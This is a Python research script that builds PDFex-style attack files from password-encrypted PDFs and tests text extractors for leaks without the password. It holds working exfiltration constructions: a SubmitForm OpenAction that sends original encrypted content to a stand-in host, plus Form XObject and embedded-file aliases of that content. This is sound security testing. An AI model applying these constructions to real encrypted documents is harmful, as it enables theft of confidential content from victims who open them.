"""
Track 3 (static, step 1) - PDFex-style exfiltration scaffolding.

Threat model (Mainka, Mladenov et al., USENIX Security '21): attacker takes an
encrypted PDF WITHOUT the password, appends attacker-controlled objects
(forms/actions/XObjects/embedded files) that reference the ORIGINAL encrypted
objects, victim opens WITH the password, viewer decrypts and exfiltrates via
SubmitForm/URI/external stream.

This script is STATIC construction only (no viewer, no network):
  form_ref      AcroForm text field whose /V references ORIGINAL content stream
                + /OpenAction /SubmitForm to http://example.invalid/collect
  xobject_alias new Page embedding ORIGINAL content stream as /Form XObject
  ef_alias      /EmbeddedFiles entry whose /EF references ORIGINAL stream

All revisions are appended WITHOUT the password (trailer has no /Encrypt,
/Prev -> original xref), same attacker capability as incremental.py/prevchain.
The no-password probe asks the only question this harness can answer honestly:
does ORIGINAL user-password content leak WITHOUT the password? Injected
canary rendering is an integrity property, not a leak.

Needs a real viewer (Adobe/Chrome/Firefox with password + network sink) to
test actual with-password exfiltration - explicitly out of scope here, noted
in the report.

Usage: python pdfex_static.py
Outputs: corpus/pdfex_static/*.pdf, findings/pdfex_static.md/.csv
"""
from __future__ import annotations

import csv
import re
from pathlib import Path

import pikepdf

from triage import EXTRACTORS, run_batch

ROOT = Path(__file__).resolve().parent
BASE = ROOT / "corpus" / "base"
OUT = ROOT / "corpus" / "pdfex_static"
FINDINGS = ROOT / "findings"

USER_PW = "Us3r-Passw0rd!"
EXFIL_URL = "http://example.invalid/collect"  # never fetched; documentation only

SEEDS = [
    "aes256_r6__plain.pdf",
    "rc4_128_r4__plain.pdf",
    "control_plain.pdf",  # unencrypted control: proves construction itself
]


def last_startxref(data: bytes) -> int:
    m = None
    for m in re.finditer(rb"startxref\s+(\d+)\s+%%EOF", data):
        pass
    if m is None:
        raise ValueError("no startxref found")
    return int(m.group(1))


def max_size(data: bytes) -> int:
    sizes = [int(x) for x in re.findall(rb"/Size\s+(\d+)", data)]
    if not sizes:
        raise ValueError("no /Size found")
    return max(sizes)


def pad_newline(buf: bytearray) -> None:
    if buf and not buf.endswith(b"\n"):
        buf += b"\n"


def add_objects(buf: bytearray, objects: dict[int, bytes]) -> dict[int, int]:
    pad_newline(buf)
    offsets: dict[int, int] = {}
    for num in sorted(objects):
        offsets[num] = len(buf)
        buf += b"%d 0 obj\n" % num + objects[num] + b"\nendobj\n"
    return offsets


def add_classic_xref(buf, offsets, trailer_extra: bytes, size: int) -> int:
    pad_newline(buf)
    xref_off = len(buf)
    nums = sorted(offsets)
    buf += b"xref\n0 1\n0000000000 65535 f \n"
    if nums:
        buf += b"%d %d\n" % (nums[0], len(nums))
        for num in nums:
            buf += b"%010d 00000 n \n" % offsets[num]
    buf += b"trailer\n<< /Size %d " % size + trailer_extra + b" >>\n"
    buf += b"startxref\n%d\n%%%%EOF\n" % xref_off
    return xref_off


class Seed:
    def __init__(self, name: str) -> None:
        self.name = name
        self.path = BASE / name
        self.data = self.path.read_bytes()
        self.encrypted = name != "control_plain.pdf"
        self.stem = self.path.stem
        self.canaries = [f"CANARY {self.stem} ALPHA", f"CANARY {self.stem} BRAVO"]
        with pikepdf.open(str(self.path), password=USER_PW if self.encrypted else "") as pdf:
            self.size = max_size(self.data)
            self.root = pdf.Root.objgen[0]
            self.encrypt = pdf.trailer.Encrypt.objgen[0] if self.encrypted else None
            self.contents = pdf.pages[0].Contents.objgen[0]


def page_with_contents(n: int, canary: str, extra_page: bytes = b"") -> tuple[dict[int, bytes], bytes]:
    content = f"BT /F1 12 Tf 72 700 Td ({canary}) Tj ET".encode("latin-1")
    objs = {
        n + 1: b"<< /Type /Pages /Kids [%d 0 R] /Count 1 >>" % (n + 2),
        n + 2: (
            b"<< /Type /Page /Parent %d 0 R /MediaBox [0 0 612 792] "
            b"/Resources << /Font << /F1 << /Type /Font /Subtype /Type1 "
            b"/BaseFont /Helvetica >> >> >> /Contents %d 0 R >>" % (n + 1, n + 3)
        ) + extra_page,
        n + 3: b"<< /Length %d >>\nstream\n" % len(content) + content + b"\nendstream",
    }
    return objs, b"%d 0 R" % (n + 3)


def build(seed: Seed, variant: str) -> tuple[Path, list[str]]:
    canary = f"INJECTED {seed.stem} {variant} ALPHA"
    buf = bytearray(seed.data)
    prev = last_startxref(seed.data)
    n = seed.size
    size = n + 12
    orig = seed.contents  # original encrypted content-stream object number

    if variant == "form_ref":
        # Catalog with AcroForm field whose /V -> ORIGINAL stream + SubmitForm action.
        objs, _ = page_with_contents(n, canary)
        objs[n] = (
            b"<< /Type /Catalog /Pages %d 0 R /AcroForm %d 0 R "
            b"/OpenAction << /S /SubmitForm /F (%s) /Fields [%d 0 R] >> >>"
            % (n + 1, n + 4, EXFIL_URL.encode("latin-1"), n + 5)
        )
        objs[n + 4] = b"<< /Fields [%d 0 R] >>" % (n + 5)
        objs[n + 5] = b"<< /FT /Tx /T (exfil) /V %d 0 R >>" % orig
        offs = add_objects(buf, objs)
        add_classic_xref(buf, offs, b"/Root %d 0 R /Prev %d" % (n, prev), size)

    elif variant == "xobject_alias":
        # New page draws ORIGINAL stream as a Form XObject (/Fm0 Do).
        draw = b"q /Fm0 Do Q"
        content = (
            f"BT /F1 12 Tf 72 700 Td ({canary}) Tj ET ".encode("latin-1") + draw
        )
        objs = {
            n: b"<< /Type /Catalog /Pages %d 0 R >>" % (n + 1),
            n + 1: b"<< /Type /Pages /Kids [%d 0 R] /Count 1 >>" % (n + 2),
            n + 2: (
                b"<< /Type /Page /Parent %d 0 R /MediaBox [0 0 612 792] "
                b"/Resources << /Font << /F1 << /Type /Font /Subtype /Type1 "
                b"/BaseFont /Helvetica >> >> /XObject << /Fm0 %d 0 R >> >> "
                b"/Contents %d 0 R >>" % (n + 1, orig, n + 3)
            ),
            n + 3: b"<< /Length %d >>\nstream\n" % len(content) + content + b"\nendstream",
        }
        offs = add_objects(buf, objs)
        add_classic_xref(buf, offs, b"/Root %d 0 R /Prev %d" % (n, prev), size)

    elif variant == "ef_alias":
        # Embedded-file spec whose /EF -> ORIGINAL stream + injected page.
        objs, _ = page_with_contents(n, canary)
        objs[n] = (
            b"<< /Type /Catalog /Pages %d 0 R "
            b"/Names << /EmbeddedFiles << /Names [(exfil.txt) %d 0 R] >> >> >>"
            % (n + 1, n + 4)
        )
        objs[n + 4] = (
            b"<< /Type /Filespec /F (exfil.txt) /EF << /F %d 0 R >> >>" % orig
        )
        offs = add_objects(buf, objs)
        add_classic_xref(buf, offs, b"/Root %d 0 R /Prev %d" % (n, prev), size)
    else:
        raise ValueError(f"unknown variant {variant}")

    out = OUT / f"{seed.stem}__pdfex_{variant}.pdf"
    out.write_bytes(bytes(buf))
    return out, [canary]


VARIANTS = ["form_ref", "xobject_alias", "ef_alias"]


def main() -> None:
    OUT.mkdir(parents=True, exist_ok=True)
    FINDINGS.mkdir(exist_ok=True)

    cases: list[dict] = []
    for name in SEEDS:
        seed = Seed(name)
        for variant in VARIANTS:
            try:
                path, injected = build(seed, variant)
            except Exception as exc:
                print(f"[skip] {seed.stem} {variant}: {type(exc).__name__}: {exc}")
                continue
            cases.append({
                "seed": name, "variant": variant,
                "file": str(path.relative_to(ROOT)),
                "encrypted": seed.encrypted,
                "injected": injected, "original": seed.canaries,
            })
            print(f"[ok] {path.name}")

    rows: list[dict] = []
    paths = [str(ROOT / c["file"]) for c in cases]
    for engine in EXTRACTORS:
        results, failure = run_batch(engine, paths, 300)
        for c in cases:
            res = {"status": "CRASH", "text": "", "error": failure} if results is None else results[str(ROOT / c["file"])]
            text = res.get("text") or ""
            norm = re.sub(r"\s+", "", text)
            inj = any(re.sub(r"\s+", "", x) in norm for x in c["injected"])
            orig_hit = any(re.sub(r"\s+", "", x) in norm for x in c["original"])
            rows.append({
                "seed": c["seed"], "variant": c["variant"], "engine": engine,
                "status": res["status"], "encrypted": c["encrypted"],
                "injected_shown": inj, "original_shown": orig_hit,
                "detail": (res.get("error") or res.get("noise") or "")[:160],
            })
        print(f"{engine}: {len(cases)} files probed")

    with open(FINDINGS / "pdfex_static.csv", "w", newline="", encoding="utf-8") as fh:
        w = csv.DictWriter(fh, fieldnames=list(rows[0].keys()))
        w.writeheader()
        w.writerows(rows)

    leaks = [r for r in rows if r["original_shown"] and r["encrypted"]]
    inj = [r for r in rows if r["injected_shown"] and r["encrypted"]]
    lines = [
        "# Track 3 (static) - PDFex-style scaffolding, no-password probes",
        "",
        "Attacker capability: append revision WITHOUT the password (trailer has",
        "no /Encrypt, /Prev -> original xref). Payloads reference the ORIGINAL",
        "encrypted content-stream object: AcroForm /V + SubmitForm /OpenAction",
        "(`form_ref`), Form XObject (`xobject_alias`), EmbeddedFile /EF",
        "(`ef_alias`). Exfil URL is http://example.invalid/collect (never fetched).",
        "",
        "Only question answered here: does ORIGINAL content leak WITHOUT the",
        "password? With-password exfiltration needs a real viewer + network sink",
        "(Adobe/Chrome/Firefox) - explicitly out of scope, noted below.",
        "",
        "| seed | variant | engine | status | injected | ORIGINAL | detail |",
        "|---|---|---|---|---|---|---|",
    ]
    for r in rows:
        lines.append(
            f"| {r['seed']} | {r['variant']} | {r['engine']} | {r['status']} | "
            f"{r['injected_shown']} | **{r['original_shown']}** | {r['detail']} |"
        )
    lines += ["",
        f"Encrypted cases with original content shown without password: **{len(leaks)}**",
        f"Encrypted cases with injected plaintext shown: {len(inj)} (integrity property).",
        "",
        "## What needs a real viewer",
        "",
        "- Open `corpus/pdfex_static/aes256_r6__plain__pdfex_form_ref.pdf` WITH",
        "  the user password in a viewer that honors /SubmitForm, submit the form,",
        "  inspect whether the decrypted field value leaves to the URL.",
        "- Same for `xobject_alias` (does the viewer decrypt + render the aliased",
        "  stream as a Form XObject?) and `ef_alias` (does save-attachment yield",
        "  decrypted bytes?). None of this is claimed here - static matrix only.",
        ""]
    (FINDINGS / "pdfex_static.md").write_text("\n".join(lines), encoding="utf-8")

    # keep report.md track blocks intact (triage.py rewrites it from scratch)
    report = FINDINGS / "report.md"
    begin, end = "<!-- track3static:begin -->", "<!-- track3static:end -->"
    body = report.read_text(encoding="utf-8") if report.exists() else ""
    if begin in body:
        body = body.split(begin)[0].rstrip() + "\n"
    block = "\n".join([begin,
        "## Track 3 (static) - PDFex-style scaffolding (2026-10-29)",
        "",
        f"- matrix: {len(cases)} synthetic files (3 variants x 3 seeds), "
        f"{len(rows)} no-password probes across 6 engines.",
        f"- **original encrypted content recovered without password: {len(leaks)}**",
        f"- injected plaintext rendered without password: {len(inj)} (integrity property).",
        "- full table: `findings/pdfex_static.md` / `findings/pdfex_static.csv`; "
        "observation: `O-2026-003` in `findings/LOG.md`.",
        "- with-password exfil via real viewer explicitly NOT tested here.",
        end, ""])
    report.write_text(body.rstrip() + "\n\n" + block, encoding="utf-8")

    print("\n=== summary ===")
    print(f"cases: {len(cases)}  probes: {len(rows)}")
    print(f"original shown without password: {len(leaks)}")
    print(f"injected shown: {len(inj)}")


if __name__ == "__main__":
    main()
